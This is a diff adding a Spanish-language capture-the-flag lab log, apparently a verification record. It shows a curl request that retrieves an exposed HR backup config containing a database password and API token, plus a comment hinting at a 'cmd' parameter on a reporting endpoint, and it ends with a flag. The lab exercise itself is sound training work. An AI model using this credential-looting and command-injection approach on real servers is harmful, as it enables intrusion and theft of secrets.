@@ -1,0 +1,13 @@
+Verificación independiente de Chiara — Lab Final
+Fecha: 2026-11-06
+Comando: curl -sS -i http://phantomcorp/backup/rrhh.conf
+
+HTTP/1.0 200 OK
+Server: PhantomClientes/2.0 
+Date: Sat, 07 Nov 2026 02:45:38 GMT
+Content-Type: text/plain
+
+DB_USER=rrhh_app
+DB_PASS=Rh-2026
+API_TOKEN=phantom-api-7c1e
+# usar el token en /api/reporte?token=...&cmd=... FLAG{final_token_looted}
